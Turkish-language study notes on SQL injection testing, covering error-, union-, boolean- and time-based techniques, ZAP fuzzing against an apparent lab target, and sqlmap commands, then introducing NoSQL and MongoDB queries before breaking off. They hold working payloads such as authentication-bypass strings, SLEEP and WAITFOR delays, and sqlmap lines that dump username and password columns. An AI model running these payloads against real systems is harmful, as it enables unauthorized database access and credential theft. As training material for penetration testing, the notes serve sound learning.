SQL enjeksiyon açıklıklarını tespit etmenin en basit ve yaygın yöntemi, uygulamanın girişlerine SQL sorgusunun söz dizimini bozabilecek özel karakterler veya test yükleri göndermektir. Bu tür girdiler genelde sunucunun sorguyu düzgün şekilde işlemesini engeller ve uygulamanın hata mesajı döndürmesine neden olarak zaafiyetin varlığını ortaya çıkarır.

==*Not:* Bir web uygulamasındaki tüm girdiler veritabanıyla etkileşime girmez. Bu nedenle, web uygulamasında keşif yapmanız ve farklı girdi parametrelerini kategorize etmeniz önerilir.==

SQLi 3 aşamada keşfedilir:

1. Input alanları çıkarılır
2. Bu input alanları veri tabanı ile etkileşime giriyor mu? Bu belirlenir.
3. Yeterli input doğrulaması olmayan  alanlara manuel/ yarı manuel(ZAP veya Burp) payloadlar denenerek test gerçekleştirilir.
 
SQL enjeksiyon zaafiyetleri, bir uygulamadaki çeşitli giriş alanlarında bulunabilir. Aşağıda SQL enjeksiyonu zaafiyetlerinin bulunabileceği yaygın enjekte edilebilir alanlara bazı örnekler verilmiştir:  

**Giriş formları:** Bir giriş formundaki kullanıcı adı ve parola alanları, SQL enjeksiyon saldırıları için yaygın hedeflerdir. Uygulama girdiyi düzgün şekilde doğrulamaz veya temizlemezse, bir saldırgan kimlik doğrulama için kullanılan SQL sorgusunu manipüle edebilir.

**Arama kutuları:** Bir uygulama içinde arama yapmak için kullanılan giriş alanları da SQL enjeksiyonu için potansiyel hedeftir. Arama sorgusu uygun doğrulamadan geçirilmeden doğrudan bir SQL ifadesine ekleniyorsa, bir saldırgan sorguyu manipüle etmek ve yetkisiz verilere erişmek için kötü amaçlı SQL kodu enjekte edebilir.

**URL parametreleri:** Web uygulamaları genellikle sayfalar arasında veri aktarmak için URL parametrelerini kullanır. Eğer uygulama bu parametreleri uygun doğrulama ve temizlemeden geçirmeden SQL sorguları oluştururken doğrudan kullanıyorsa, SQL enjeksiyon saldırılarına açık olabilir.

**Form alanları:** Kayıt formları, iletişim formları veya yorum alanları gibi formlardaki herhangi bir giriş alanı, girdi SQL sorgularında kullanılmadan önce düzgün şekilde doğrulanıp temizlenmezse SQL enjeksiyonuna karşı savunmasız olabilir.

**Gizli (hidden) alanlar:** HTML formlarındaki gizli alanlar da, bu alanlardan gelen veriler uygun doğrulama yapılmadan SQL sorgularına doğrudan eklenirse SQL enjeksiyon saldırılarına maruz kalabilir.

**Çerezler:** Bazı durumlarda, kullanıcı verisi veya oturum bilgisi içeren çerezler SQL sorgularında kullanılabilir. Uygulama çerez verisini doğru şekilde doğrulamaz veya temizlemezse bu da SQL enjeksiyon zafiyetlerine yol açabilir.

*MANUEL TESTING:*

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
https://github.com/payloadbox/sql-injection-payload-list

**Manuel test (kötü amaçlı girdilerle):** Giriş formlarına, arama kutularına veya URL parametrelerine kasıtlı olarak zararlı veya özel karakterler içeren girdiler göndererek uygulamanın nasıl davrandığını gözlemleyin. Beklenmeyen çıktı, uygulamanın çökmesi, ayrıntılı hata mesajları veya girdinin sorgu mantığını etkilediğini gösteren işaretler (ör. doğrulama atlama, beklenmeyen sonuçlar) tespit edilebilir.

- **Hata tabanlı test (error-based):** Amaçlı olarak sözdizimsel hatalar içeren girişler göndererek **veritabanı tarafından üretilen hata mesajlarını tetiklemeye çalışın.** Bu tür hatalar bazen altta yatan SQL sorgusunun yapısını, kullanılan tabloları ya da yürütülen ifadeleri açığa vurabilir.
- **Union-tabanlı test:** Giriş alanlarına `UNION SELECT` ifadeleri enjekte etmek, uygulamanın diğer tablolar veya veri tabanlarından veri alarak SQL enjeksiyonuna açık olup olmadığını belirlemeye yardımcı olabilir.
- **Boolean-tabanlı test:** Boolean koşullarına dayalı olarak uygulamanın cevabını manipüle etmek, uygulamanın zafiyete açık olup olmadığını anlamaya yardımcı olabilir. Örneğin, kimlik doğrulamayı atlamak için bir giriş formuna `' OR '1'='1` enjekte etmek.
- **Zamana-dayalı test:** Zaman gecikmeli SQL sorguları enjekte etmek, sunucu yanıtındaki gecikmeleri gözlemleyerek uygulamanın zaman-açığı (time-based blind) SQL enjeksiyonuna açık olup olmadığını ortaya çıkarabilir.

Bir uygulama girdisini SQL enjeksiyonu için test etmek genellikle şunları enjekte etmeyi içerir:

- **String sonlandırıcılar:** `'` ve `"`
- **SQL komutları:** `SELECT`, `UNION` ve diğer SQL komutları
- **SQL yorumları:** `#` veya `--`

==Ayrıca, enjekte edilebilecek parametrenin/girdinin string tabanlı mı yoksa tamsayı (integer) tabanlı mı olduğunu dikkate almak da önemlidir. Bu gidişatı belirlemede işimize yarar.==

Bazı durumlarda SQL sorguları enjekte edilebilir parametreye bağlı olarak bir integer şeklinde ele alınacaktır:

![[Pasted image 20250914235215.png]]

Bu gibi durumlarda, enjeksiyonu test etmek için mantıksal işlemciler (boolean) kullanan SQL sorguları kullanılması önerilir.

![[Pasted image 20250914235621.png]]

Bazı durumlarda, SQL sorguları enjekte edilebilir parametreyi bir string olarak ele alır:

![[Pasted image 20250914235912.png]]

Bu gibi durumlarda, tek tırnak gibi özel SQL karakterlerini kullanarak string sabitlerini sınırlandırmanız önerilir.

![[Pasted image 20250914235956.png]]

SQL enjeksiyon zaafiyetleri genellikle kullanıcıdan alınan verilerin uygulama tarafından yeterince doğrulanmaması, temizlenmemesi veya güvenli şekilde işlenmemesi sonucunda ortaya çıkar. Bu tür saldırılarda sıkça kullanılan yöntemlerden biri, 
**tek tırnak (`'`) karakterini** kötüye kullanmaktır.

SQL’de tek tırnak, string değerleri başlatmak ve bitirmek için kullanılır. Eğer kullanıcıdan gelen veri doğrudan SQL sorgusuna eklenirse, saldırgan bu tırnak karakterini girdiye dahil ederek sorgunun yapısını bozabilir. Bu sayede:

- Orijinal sorgunun mantığını değiştirebilir,
- Yetkisiz veri erişimi sağlayabilir,
- Kötü amaçlı SQL ifadelerinin çalıştırılmasına imkân tanıyabilir.

Örneğin, kullanıcı adı ve şifre girişlerinin uygun bir doğrulama yapılmadan bir SQL sorgusuna birleştirildiği bir oturum açma formunu ele alalım:

![[Pasted image 20250915000802.png]]

Uygulama, girdideki tek tırnak karakterini doğru şekilde işlemezse, saldırgan tek tırnak karakteri ekleyerek dize sabitini sonlandırabilir ve kötü amaçlı SQL kodunu ekleyebilir. İşte bir saldırı yükü örneği:

-        '  OR '1'='1' ; --        (Bu sorgu Authenticationu bypass edecektir)

Her DBMS/RDBMS, hatalı/yanlış SQL sorgularına farklı hata mesajlarıyla yanıt verir. Bu, DBMS/RDBMS'nin bir özelliğidir.

MS-SQL Hata Mesajları:
![[Pasted image 20250915001944.png]]
MY-SQL Hata Mesajları:
![[Pasted image 20250915002011.png]]

*EK - YAYGIN SQL PAYLOADLARI:*

![[Pasted image 20250915002325.png]]

*CHEAT SHEET and PAYLOAD LISTS:*
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
https://github.com/payloadbox/sql-injection-payload-list
https://portswigger.net/web-security/sql-injection/cheat-sheet
## Finding SQLi-2 ( with ZAP):

SQLi zafiyetlerini teyit edebilmek için ZAP kullanacağız. ZAP da hazır payloadları enjekte edilebilen alanlara enjekte ederek süreci otomatikleştirebiliriz. Ancak dikkat etmemiz gereken bir şey FP durumlarına dikkat etmek olacaktır.

OWASP **ZAP (Zed Attack Proxy)** içindeki **Fuzzer**, bir uygulamanın girdilerine farklı değerler (payload’lar) göndererek beklenmeyen davranışları veya güvenlik açıklarını bulmaya yarayan bir araçtır. SQLi için bunun kullanımını keşfeceğiz.
([Mutilitade2](https://tld4nrccw9brsrrc20qomi9u8.us-east-10.attackdefensecloudlabs.com/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details) )

**1)**
name:test ve password:test olacak şekilde istek yapılmıştır.

![[Pasted image 20250917171229.png]]

**2)**
Aşağıda POST isteği yakalanmış ve FUZZ'a yönlendirilmiştir.

![[Pasted image 20250917171153.png]]

**3)** Enjekte yapılacak alan olan username=test kısmına Add Payload kısmından ZAP'ın kendisinde var olan SQL Payloadları seçilmiş ve Fuzzing ayarları yapıldıktan sonra başlatılmıştır.
![[Pasted image 20250917171410.png]]

**4)**  Aşağıda FUZZ'ın sonuçları gözükmektedir bazı istekler False-Pozitif olsa da test edilerek payloadın işe yarayıp yaramadığı görülebilir. Testler sonucu bazı payloadların işe yaradığı görülmüştür.

![[Pasted image 20250917171625.png]]
-
## In-Band SQL Injection:

**Bant içi (in-band) SQL enjeksiyonu**, en yaygın SQL enjeksiyonu saldırısı türüdür. Saldırganın **aynı iletişim kanalını** hem saldırıyı göndermek hem de sonuçları almak için kullandığı durumlarda meydana gelir.
Başka bir deyişle, saldırgan kötü amaçlı SQL kodunu web uygulamasına enjekte eder ve saldırının sonuçlarını **kodu gönderdiğiyle aynı kanal** aracılığıyla alır.
Bant içi SQL enjeksiyonu saldırıları tehlikelidir çünkü **hassas bilgilerin çalınması**, verilerin değiştirilmesi veya silinmesi ya da tüm web uygulamasının hatta sunucunun ele geçirilmesi için kullanılabilir.
#### Error Based(In-Band SQLi):

**Hata tabanlı (error-based) SQL enjeksiyonu**, saldırganların web uygulamalarındaki SQL enjeksiyonu zaafiyetlerinden yararlanmak için kullandıkları bir tekniktir.
Bu teknik, **veritabanı hatalarını kasıtlı olarak meydana getirmeye** ve veritabanının döndürdüğü **hata mesajlarını** kullanarak bilgi çıkarmaya veya uygulamanın veritabanına yetkisiz erişim sağlamaya dayanır.
Hata mesajı, veritabanı şeması veya veritabanının içeriği hakkında **değerli bilgiler** içerebilir; saldırgan bu bilgileri zaafiyeti daha fazla istismar etmek için kullanabilir.
Hata tabanlı SQL enjeksiyonu zaafiyetlerini tespit etmek, uygulamanın bu tür saldırılara **açık olup olmadığını** belirlemek için web uygulamasının test edilmesini gerektirir.

*TESPİT:*

- **Zafiyetli bir parametre tespit edin:** Web uygulamasında SQL enjeksiyonuna açık bir parametre bulun — genellikle kullanıcı girişi alanları, URL parametreleri veya form girdileri aracılığıyla.
- **Kötü amaçlı SQL kodu enjekte edin:** Veritabanı hatası tetikleyecek SQL ifadeleri içeren bir payload hazırlayın. Bu, geçersiz SQL sözdizimi eklemeyi veya mevcut sorguları manipüle etmeyi içerebilir.
- **Hata mesajlarını gözlemleyin:** Payload’u zafiyetli parametreye gönderin ve veritabanının döndürdüğü hata mesajını inceleyin. Hata mesajı veritabanının yapısı ve içeriği hakkında **değerli bilgiler** sağlayabilir. 
	Ve sonuca göre tekrar payloadı revize edin ve  gönderin veri tabanından daha fazla değerli, bilgi almaya/çıkarmaya çalışın.

![[Pasted image 20250917190629.png]]

==Yukarıdaki gibi bir hata bize Error-Based SQLi'ın varlığını gösterecektir. Süreç Burp ve ZAP gibi araçlarla otomatize edilebilir==
##### SQL Map:

https://github.com/payloadbox/sql-injection-payload-list  listesindeki kapsamlı payloadlar sqli bulmamızı sağlar ancak veri tabanını kapsamlı ve derinlemesine enumerate etmek için yetersiz kalabilir.  Bunun için oldukça güçlü olan sqlmap bu aşamada önemlidir.

*SQLMap:*

Güçlü bir tespit motoru, en üst düzey sızma testi uzmanları için birçok özel özellik ve veritabanı parmak izinden, veritabanından veri almaya, altta yatan dosya sistemine erişimden işletim sisteminde bant dışı bağlantılar aracılığıyla komut çalıştırmaya kadar geniş bir anahtar yelpazesiyle birlikte gelir. https://sqlmap.org/

SQLMap, kendi geliştirilmiş motoruyla web uygulamalarındaki SQL enjeksiyon açıklarını tespit eden bir araçtır. Hedef URL veya parametreyi analiz eder, veritabanı türünü belirler ve açığı doğrulamak için dinamik olarak SQL payload’ları üretir. Payload’lar parametre tipi, veritabanı türü, açık türü ve sunucunun yanıtına göre optimize edilir; böylece hem test hem de veri çekme işlemleri otomatik ve etkili şekilde gerçekleştirilir.

Parametreli bir URL kullanımında çok temel kullanım şu şekildedir:

`sqlmap -u "http://example.com/page.php?id=1" --dbs`

- `-u`: Test edilecek URL
- `--dbs`: Veritabanı isimlerini listele
- -`p:` Eğer spesifik parametre belirtecek olursak.

Ancak her zaman parametreler URL üzerinden gönderilmeyebilir ve gövdede taşınabilir. (Örneğin POST istekleri)

Bu tür isteklerde parametreler üzerinde test yaparken isteğimizi Burp veya ZAP gibi bir proxy ile yakaladıktan sonra request olarak kaydettiğimizi düşünelim:

Örneğin request içeriği: 

![[Pasted image 20250919235148.png]]
 
`sqlmap -r request.txt --dbs`

- `-r request.txt` → SQLMap’e HTTP isteğini dosyadan oku demek.
- `--dbs` → Veritabanı isimlerini listele.

> SQLMap, POST verilerini otomatik olarak algılar ve `username` veya `password` gibi parametreleri test eder.

`sqlmap -r request.txt -p username --dbs`

-p sayesinde ise spesifik parametre belirtilebilir. Bu sayede sadece `username` parametresi üzerinde enjeksiyon denemesi yapılır, `password` atlanır.

	`--technique=BEUSTQ`

Spesifik bir parametrede manuel olarak belirli bir sql injection keşfettikten sonra diğer sql tiplerine özgü payloadları denememize gerek olmayabilir bu yüzden --technique parametresi ile parametre belirttikten sonra kullanılacak tekniği de belirtebiliriz.
Özetle, `--technique` parametresi, SQLMap’in **hangi SQL enjeksiyon yöntemlerini kullanacağını belirler**. Bu, özellikle hedef sitenin tepkilerine göre hızlı ve kontrollü test yapmak istediğinizde çok faydalıdır.

| Harf  | Açılım            | Açıklama                                       |
| ----- | ----------------- | ---------------------------------------------- |
| **B** | Boolean-based     | Sayfa yanıtına göre doğru/yanlış kontrolü      |
| **E** | Error-based       | Hata mesajlarını kullanarak veri çekme         |
| **U** | UNION query-based | UNION SELECT ile veri çekme                    |
| **S** | Stacked queries   | Birden fazla sorguyu üst üste çalıştırma       |
| **T** | Time-based blind  | Sayfa yanıt süresine göre veri çekme           |
| **Q** | Inline queries    | Bazı veritabanlarında inline sorgu enjeksiyonu |
|       |                   |                                                |

- `--current-db` → Mevcut aktif veritabanının adını alır.
- `--current-user` → Veritabanına bağlanan **kullanıcı adını** gösterir.
- `--current-host` → Veritabanı sunucusunun **host adını** veya IP’sini verir.
- `--current-role` → Eğer varsa, **mevcut kullanıcının rolünü** sorgular.
- `--tables` → Hedef veritabanındaki **tüm tabloları listeler**.
- `--columns` → Belirli bir tablo içindeki **sütunları listeler**.
- `--count` → Tablo veya sütun sorgularında **kaç kayıt çekileceğini sınırlamak** için kullanılır.
- `--dump` → Tablo veya sütunlardaki **verileri çekip gösterir**.

Data base ismi belirlendikten sonra (--current-db ile)  --tables ile tablo isimleribi alabiliriz ve süreç aşağıdaki gibi devam eder:

1.`sqlmap -u "http://example.com/page.php?id=1" -D testdb --tables`                                                     

2.`sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --columns`

3.`sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --dump`  veya

4.`sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users -C username,password --dump`

#### Union Based(In-Band SQLi):

Union tabanlı SQL enjeksiyonu (Union-based SQL injection), SQL sorgularında UNION operatörünün kullanılabilme yeteneğini istismar eden bir SQL enjeksiyonu türüdür.
Bu zafiyet, bir uygulama kullanıcı girdisini uygun şekilde doğrulayıp temizlemediğinde ortaya çıkar; saldırgan, sorguya zararlı SQL kodu enjekte edebilir. ==UNION operatörü, SQL’de iki veya daha fazla SELECT ifadesinin sonuçlarını tek bir sonuç kümesinde birleştirmek için kullanılır.==

==Birleştirilen SELECT ifadelerindeki sütun sayısının ve bu sütunların veri tiplerinin eşleşmesi gerekir. Ayrıca sütunların sırası ve uyumluluğu da önemlidir; uyumsuzluk hâlinde sorgu hatası döner.== Union tabanlı enjeksiyonlar sayesinde saldırganlar, uygun koşullar sağlandığında veritabanından hassas verileri (kullanıcı adları, parolalar, e-posta adresleri vb.) çekebilir veya sorgu mantığını değiştirerek yetkisiz bilgi sızdırılmasına yol açabilir.

![[Pasted image 20250920145357.png]]

Bir saldırgan, <user_input> parametresine UNION tabanlı bir saldırı yükü enjekte ederek bu güvenlik açığını istismar edebilir. Örneğin,

![[Pasted image 20250920145425.png]]

Enjekte edilen yük, kredi kartı numaralarını ve credit_cards tablosundan özel bir değer ('hack') almak için orijinal sorguyu değiştirir. Sonundaki çift tire, orijinal sorgunun geri kalan kısmını yorumlamak için kullanılır.

![[Pasted image 20250920150011.png]]

Veritabanı daha sonra bu değiştirilmiş sorguyu yürütür ve sonuç, orijinal kullanıcı verilerinin yanı sıra kredi kartı numaralarını da içerir. Saldırgan daha sonra bu hassas bilgileri çıkarabilir. ==Ancak sorun şudur ki gerçek bir senaryoda hangi veritabanı ve hangi tabloyla çalıştığımızı, kolonların isimlerini vb. bilmeyiz. Bu yüzden önce bunların enumerate edilmesi gerekecektir.==

`UNION` ile iki SELECT birleştirildiğinde **her iki SELECT’in döndürdüğü sütun sayısı aynı** olmalıdır ve ideal olarak sütunların veri tipleri uyumlu olmalıdır. Eğer sütun sayıları farklıysa veya türler uyuşmuyorsa veritabanı hata verir. Bu yüzden saldırgan:

1. Kaç sütun olduğunu bulur,
2. Hangi sütunların uygulama çıktısında göründüğünü veya string/number olduğunu tespit eder,
3. Ardından kendi SELECT'ini uygun sütun sayısı ve tipine göre oluşturur.

==UNION SELECT 1,2,3,4,5#  gibi bir örnek bir UNION ifadesi ile birlikte sayfada görünen sayı hangi sütunun/sütunların render edildiğini gösterir.== Ardından görünen sütuna `database()`, `version()`, `table_name` gibi ifadeler koyarak bilgi çıkarın: `UNION SELECT NULL, database(), NULL--` vb.

Modern veritabanı sistemlerinde, sistemin kendi yapısını ve meta-verilerini (yani **hangi veritabanları var, tablolarda hangi kolonlar var, hangi kullanıcılar var** gibi bilgileri) tutan özel tablolar bulunur. Bunlara genelde **system tables** veya **metadata tables** denir. Bu tabloları (veritabanı sistemine özgü isimlendirmeleri olabilir) kullanarak veri çıkarmak istediğimiz tablo isimlerini öğrenir ve ona göre UNION SELECT komutu yazarız.
#### Boolen Based (Blind SQLi):

Blind SQL Injection, doğrudan veritabanı hakkında bilgi ya da enjekte edilen SQL sorgusunun sonuçlarını yanıt içinde açığa çıkarmayan bir web uygulamasındaki zafiyeti istismar eden bir SQL Injection türüdür.

Bu saldırı türünde saldırgan, uygulamanın giriş alanına zararlı SQL kodu enjekte eder; ancak uygulama yanıtında faydalı bilgi veya hata mesajı döndürmez. Saldırgan, uygulamanın sayfa içeriğindeki küçük farklılıklar, HTTP durum kodları veya yanıt sürelerindeki değişimler gibi dolaylı çıktıların (ör. true/false davranışı veya zaman gecikmeleri) gözlemlenmesiyle veriyi çıkarır. Blind SQL Injection genellikle iki ana alt türe ayrılır: boolean-based (mantıksal) ve time-based (zaman tabanlı) saldırılar. Uygulama davranışlarına dikkatlice bakılarak, saldırgan adım adım veritabanı yapısını, sütun isimlerini ve hassas verileri türetebilir.

Blind SQL injection (Kör SQL Enjeksiyonu) iki alt tipe / istismar tekniğine ayrılabilir:

**Boolean-based SQL Injection:** Bu saldırı türünde saldırgan, veritabanı hakkında bilgi çıkarmak için uygulamanın boolean (doğru/yanlış) koşullarına verdiği tepkiyi kullanır. Saldırgan uygulamaya kötü amaçlı SQL sorguları gönderir ve sorgunun başarılı olup olmamasına ya da sayfa içeriğindeki değişikliklere bakarak (ör. belirli bir metnin görünüp görünmemesi) yanıtı değerlendirir; böylece adım adım veri ve yapı hakkında çıkarım yapar.

**Time-based Blind Injection:** Bu yöntemde saldırgan, uygulamanın doğrudan veri veya hata mesajı döndürmediği durumlarda yanıt sürelerindeki farklılıkları kullanır. Saldırgan uygulamaya, koşula bağlı olarak veritabanında bekleme (delay) oluşturan ifadeler içeren sorgular gönderir ve uygulamanın cevap verme süresini ölçerek ilgili koşulun doğru mu yanlış mı olduğunu çıkarır.

==Her iki teknikte de uygulama doğrudan hata veya veri döndürmediği için saldırgan, küçük davranış farklılıklarını (yanıt içeriği, HTTP durum kodu, sayfa yükleme süresi vb.) dikkatle gözlemleyerek veritabanı yapısı, tablo ve sütun isimleri ile hassas veriler hakkında adım adım çıkarım yapabilir.==

Bu kavramı açıklamak için bir örnek verelim. Diyelim ki, kullanıcının sağladığı kimlik bilgilerini kontrol etmek için aşağıdaki SQL sorgusunu kullanan, güvenlik açığı bulunan bir giriş sayfası var:

![[Pasted image 20250923110628.png]]
  
Bir saldırgan, kullanıcı adı parametresini manipüle ederek boolean tabanlı bir SQL enjeksiyon saldırısı girişiminde bulunabilir. Örneğin, saldırgan aşağıdaki kullanıcı adını girerse:

`' OR '1'='1' `

Bu gibi bir sorguda web uygulaması doğrudan herhangi bir çıktı vermez ancak yukarıda 1=1 olduğundan veri tabanı True dönmesini bekleriz  ve buna göre bir davranış sergiler.

Kör (blind) saldırılarda saldırgan sorgu sonuçlarını doğrudan görmez; bunun yerine koşullu ifadeler kullanarak bilgiyi dolaylı yoldan çıkarır. Örneğin saldırgan şöyle bir enjeksiyon hazırlayabilir: `'*' OR LENGTH(database()) > 5 --` — bu ifade veritabanı adının uzunluğunun 5'ten büyük olup olmadığını sınar. Uygulamanın verdiği yanıtı (ör. sayfada belirli bir içeriğin görünmesi veya yanıtta gecikme oluşması) gözlemleyerek saldırgan, adım adım veritabanı yapısı hakkında bilgi çıkarabilir.

Kritik noktalar — kısa özet:

1. Kör enjeksiyonlarda bilgi doğrudan değil, uygulama davranışındaki değişiklikler (içerik farkı, HTTP kodu, yanıt süresi vb.) üzerinden elde edilir.
2. Örnek enjeksiyonlar genellikle koşullu ifadeler içerir (`LENGTH`, `SUBSTRING`, `IF`, `SLEEP` gibi) ve her adımda tek bir bitlik bilgi (true/false) elde edilir.

Aşağıdaki  `1 and 1=1--`   sorgusu True döner ve bu durumdaki davranışı inceleyecek olursak: 

![[Ekran görüntüsü 2025-09-23 161617 1.png]]

True döndüğünde sayfa tüm içerikleri gösterir.(renden edilmiş görüntüde tüm içerikler gözükür)
![[Ekran görüntüsü 2025-09-23 161628.png]]

Ama sorgub false dönecek olsaydı(aşağıdaki gibi):

![[Ekran görüntüsü 2025-09-23 161637.png]]

False döndüğü zaman sayfa yanıt olarak "Leave a Comment" şeklinde bir yorum bırakmaya yönlendiriyor. 
![[Ekran görüntüsü 2025-09-23 161646.png]]

Görüldüğü gibi herhangi bir hata mesajı olmamasına rağmen sayfa davranışından SQLi'nin varlığını doğrulamış olduk. Buradaki SQLi Blind SQLi'dir çünkü herhangi bir hata mesajı döndürmedi ve sayfanın davranışından sorguların yürütülüp yürütülmediğini anladık.

SQL’de **`SUBSTRING`** fonksiyonu, bir metin (string) içinden belirli bir bölümünü (alt dizisini) almaya yarar. Yani bir kelimenin içinden parça kesip çıkarmak için kullanılır. Bu özellikle Blind SQLi payloadlarında karşımıza oldukça çıkar. Örneğin:

`and substring( version(),1,1) = 4`    Bu komut eğer DBMS'in versiyonu 4 ile başlıyorsa True dönecek ve sayfa ona göre davranış sergileyecektir.

SUBSTRING(string, start, length)
- **string** → Metin ya da kolon ismi
- **start** → Başlangıç pozisyonu (1’den başlar)
- **length** → Kaç karakter alınacağı

#### Time Based (Blind SQLi):
**Time-based SQLi**, hedef uygulamanın doğrudan veri döndürmediği (veya hata mesajı göstermediği) “blind” (görünmeyen) durumlarda **veritabanı sunucusunu kasıtlı geciktirip** (ör. `SLEEP()`/`WAITFOR`) sayfanın yanıt süresine bakarak bilgi çıkarmaya çalıştığınız tekniktir. **Boolean-based (true/false) SQLi** ise sayfanın içeriğinin değişip değişmediğine — doğru/yanlış sonuçlarına — bakarak aynı işi yapar. Temelde ikisi de **çıkış (output) yokken bilgi sızdırma** amaçlı blind tekniklerdir; mantık benzer ama test/işaretleme farklıdır.


Zamana dayalı SQL enjeksiyon saldırısının bir örneği: 
Kullanıcının kullanıcı adı ve şifresini girdiği, uygulamanın da kimlik bilgilerini doğrulamak için SQL sorgusu gerçekleştirdiği, güvenlik açığı bulunan bir giriş formumuz olduğunu varsayalım:

![[Pasted image 20250925113341.png]]

Bir saldırgan, gecikmeye neden olan kötü amaçlı SQL kodu enjekte ederek bu güvenlik açığını istismar edebilir. Örneğin, saldırgan kullanıcı adı olarak aşağıdaki girişi sağlayabilir:

`' OR SLEEP(5)--`

![[Pasted image 20250925113743.png]]


**BENCHMARK** (MySQL bağlamında) bir **fonksiyondur**; verilen bir ifadeyi belirtilen sayıda tekrar çalıştırır ve **performans/CPU yükü** yaratır. Genelde sorgu performansını ölçmek veya (SQLi bağlamında) zaman tabanlı gecikme yaratmak için kullanılır.

- Sözdizimi: `BENCHMARK(count, expression)`
    - `count` → ifadenin kaç kere çalıştırılacağı (tam sayı)
    - `expression` → her iterasyonda çalıştırılacak ifade (ör. `MD5('a')`)
- Dönen değer genelde 0’dır; amaç süre ölçümü veya CPU yükü oluşturmaktır — doğrudan bekleme (sleep) fonksiyonu gibi sabit bir gecikme vermez. Gecikme **işlemci performansına, sunucu yüküne ve optimizasyona** bağlıdır. Yani daha az deterministiktir ama bazı ortamlarda `SLEEP` engellenmişse veya izin yoksa işe yarar.

` 'OR BENCHMARK(1000000, MD5('test'));`
` 'OR BENCHMARK(1000000, ENCODE('test'));`


**WAITFOR**, Microsoft SQL Server (T-SQL) içinde kullanılan bir kontrol ifadesidir. Sorgu çalışırken **belirli bir süre beklemeyi** sağlar

`WAITFOR DELAY '00:00:05';`

`IF (SUBSTRING(DB_NAME(),1,1) = 'm')`
    `WAITFOR DELAY '00:00:05';`

Eğer veritabanı adı “m” ile başlıyorsa sorgu 5 saniye bekler.

*NOT:* IF'ın kullanımı :  `IF(expr, true_value, false_value)` Örneğin: 
Eğer database()'in ilk harfi 'a' ise 5 sn bekle:
`?id=1 AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--`



## NoSQL:

NoSQL veritabanları, “Not Only SQL” olarak da bilinen ve verileri saklama ve sorgulamada ilişkisel olmayan yaklaşım sunan bir veritabanı yönetim sistemi sınıfıdır
Klasik ilişkisel veritabanlarının önceden tanımlı şemalara sahip tablolar kullanmasının aksine, NoSQL veritabanları daha esnek veri modelleri sağlar; yapılandırılmamış, yarı yapılandırılmış veya hızla değişen verileri işleyebilir.
NoSQL veritabanları, modern veri tiplerini ve iş yüklerini yönetmede ölçeklenebilirlik, performans ve çeviklik ihtiyacına cevap olarak ortaya çıkmıştır.

**Key-Value Stores (Anahtar-Değer Depoları):**  
Bu veritabanları, verileri anahtar-değer çiftleri koleksiyonu olarak saklar. Değer kısmı metin, JSON ya da ikili (binary) nesneler gibi herhangi bir veri türü olabilir. Örnekler: **Redis, Riak, Amazon DynamoDB**.

**Document Databases (Doküman Veritabanları):**  
Doküman veritabanları, JSON benzeri dokümanlar şeklinde veri saklar ve sorgulama/indeksleme işlemlerini doküman içeriğine göre yapar. Dokümanların yapısı farklılık gösterebilir. Popüler örnekler: **MongoDB, Couchbase Server**.

**Columnar Databases (Sütun Bazlı Veritabanları):**  
Bu veritabanları, verileri satırlar yerine sütunlar halinde organize eder. Bu yapı, özellikle analitik iş yüklerinde ve büyük veri hacimlerinin işlenmesinde yüksek verimlilik sağlar. Örnekler: **Apache Cassandra, Apache HBase**.


![[Pasted image 20250927183523.png]]

![[Pasted image 20250927184226.png]]

**MongoDB:**  
MongoDB, verileri esnek, JSON benzeri dokümanlarda saklayan bir doküman veritabanıdır. Yüksek ölçeklenebilirlik, otomatik sharding (veri bölme) ve güçlü bir sorgu dili sunar.
**Cassandra (Apache Cassandra):**  
Apache Cassandra, çok sayıda sunucuya dağıtılmış büyük veri kümelerini işlemek için tasarlanmış bir sütun bazlı veritabanıdır. Yüksek erişilebilirlik, hata toleransı ve doğrusal ölçeklenebilirlik sağlar.
**Redis:**  
Redis, bellekte çalışan (in-memory) bir anahtar-değer deposudur. Veritabanı, önbellek (cache) veya mesaj aracısı (message broker) olarak kullanılabilir. Geniş veri yapısı desteği sunar ve yüksek performans ile düşük gecikme sağlar.


NoSQL veritabanları, veri sorgulama ve manipülasyon için genellikle kendilerine özgü sorgu dilleri veya arayüzlere sahiptir. İşte bazı popüler NoSQL veritabanlarında kullanılan sorgu dillerine örnekler:

**MongoDB:**  
MongoDB, **MongoDB Query Language (MQL)** adlı sorgu dilini kullanır. MQL, veritabanındaki dokümanları sorgulamak ve üzerinde işlem yapmak için zengin bir operatör ve fonksiyon seti sunar.

**Redis:**  
Redis, aslında bellek içi bir veri yapısı deposudur ve geleneksel bir sorgu diline sahip değildir. Bunun yerine, diziler (strings), listeler (lists), kümeler (sets) ve hash tablolar (hashes) gibi farklı veri yapıları üzerinde işlem yapan bir komut seti sağlar. Redis komutları tipik olarak veri okuma-yazma, veri manipülasyonu ve veri süresi (expiration) yönetimi için kullanılır.

#### Örnek Sorgular(MongoDB):
1. Veritabanı İşlemleri
`// Mevcut veritabanlarını listele`
`show dbs`  

`// Veritabanı seç / yoksa oluşturur`
`use testDB`  

`// Aktif veritabanını öğren`
`db`  

2. Koleksiyon (Collection) İşlemleri
`// Koleksiyonları listele`
`show collections`  

`// Yeni koleksiyon oluştur`
`db.createCollection("users")`  

`// Koleksiyon sil`
`db.users.drop()`

3. Veri Okuma (Find)
`// Tüm verileri getir`
`db.users.find()`

`// Veri sayısı döndürnme
`db.users.find.count()

`// Daha okunaklı`
`db.users.find().pretty()`

`// Filtreleme`
`db.users.find({ age: 25 })`

`// Sadece belirli alanlar`
`db.users.find({}, { name: 1, _id: 0 })`

4. Sıralama ve Limit İşlemleri:
`// Yaşa göre artan sıralama`
`db.users.find().sort({ age: 1 })`

`// Yaşa göre azalan sıralama`
`db.users.find().sort({ age: -1 })`

`// İlk 2 kaydı getir`
`db.users.find().limit(2)`


5. Regex İfadeleri:
`// İsmi "Ali" ile başlayanları getir`
`db.users.find({ name: { $regex: "^Ali" } })`

`// İsmi "me" içerenleri getir (case-sensitive)`
`db.users.find({ name: { $regex: "me" } })`

`// Büyük/küçük harf duyarsız arama`
